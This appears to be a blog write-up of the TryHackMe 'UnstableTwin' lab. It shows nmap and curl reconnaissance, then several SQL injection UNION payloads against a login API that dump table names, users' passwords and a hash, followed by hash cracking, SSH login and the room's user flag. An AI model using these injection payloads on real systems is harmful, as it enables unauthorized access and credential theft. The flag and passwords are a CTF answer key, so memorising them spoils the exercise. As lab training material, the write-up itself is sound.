---
title: UnstableTwin
layout: post
author: MaskdMafia
date: 2021-05-20 17:02:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/unstabletwin
---

Starting with the usual Nmap scan, we discover that only 2 ports are open.

```py
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 ba:a2:40:8e:de:c3:7b:c7:f7:b3:7e:0c:1e:ec:9f:b8 (RSA)
|   256 38:28:4c:e1:4a:75:3d:0d:e7:e4:85:64:38:2a:8e:c7 (ECDSA)
|_  256 1a:33:a0:ed:83:ba:09:a5:62:a7:df:ab:2f:ee:d0:99 (ED25519)
80/tcp open  http    nginx 1.14.1
|_http-server-header: nginx/1.14.1

```
On running the gobuster scan we get 2 directories /api (with status 404) and /info (with status 200) which tells us that the login API needs to be called with username and password on visiting /info .

To get the build version we send a request to /info 

```py
curl -i -s http://10.10.196.16/info

```
However it returned 1.3.6-final (which did not turn out to be the correct answer),so I thought it is some machine error and so I sent the request again and (much to my bewilderment).got a different build version.

```
1.3.4-dev
```
After this I sent a request to the login API with an arbitrary username and password as directed in /info and got the result that the credentials are incorrect

```py
curl -XPOST 'http://10.10.196.16/api/login' -d 'username=admin&password=admin'
"The username or password passed are not correct."
```
The box has an SQLi tag so i decided to try exploiting it in that direction and tried to list our the table names in the sqlite_master database. 
Basically sqlite_master is the master listing of all database objects in the database and the SQL used to create each object. 
The sqlite_master contains the following columns:

```
The sqlite_master table contains the following columns:

Column Name	Description
type	    The type of database object such as table, index, trigger or view.
name	    The name of the database object.
tbl_name	The table name that the database object is associated with.
rootpage	Root page.
sql	        SQL used to create the database object.

```
So I basically have to display the information stored in tbl_name column.
Here's my request:

```py
curl -XPOST 'http://10.10.196.16/api/login' -d "username=1'UNION SELECT 1,group_concat(tbl_name) from sqlite_master where type='table' -- -&password=admin"



[
  [
    1, 
    "users,sqlite_sequence,notes"
  ]
]

```
Now sqlite_sequence is one of the default tables present in SQL ,so it is not probably not important right now.
So I list out the data in the **users** table :

```py
curl -XPOST 'http://10.10.196.16/api/login' -d "username=1' UNION SELECT username,password from users -- -&password=admin"


[
  [
    "julias", 
    "Red"
  ], 
  [
    "linda", 
    "Green"
  ], 
  [
    "marnie", 
    "Yellow "
  ], 
  [
    "mary_ann", 
    "continue..."
  ], 
  [
    "vincent", 
    "Orange"
  ]
]

```

But Mary Anns' password is not listed here so i proceed to similarly list the information in the **notes** table:

```py
curl -XPOST 'http://10.10.196.16/api/login' -d "username=1'UNION SELECT 1,notes from notes -- - -- -&password=admin"



[
  [
    1, 
    "I have left my notes on the server.  They will me help get the family back together. "
  ], 
  [
    1, 
    "My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n"
  ]
]

```
Seems like a hash,right? So I proceed to crack the hash online using [Crackstation](https://crackstation.net/) and get the SSH password.

```
Experiment
```
After this I log in via SSH and retieve the User Flag.

***User Flag : THM{Mary_Ann_notes}***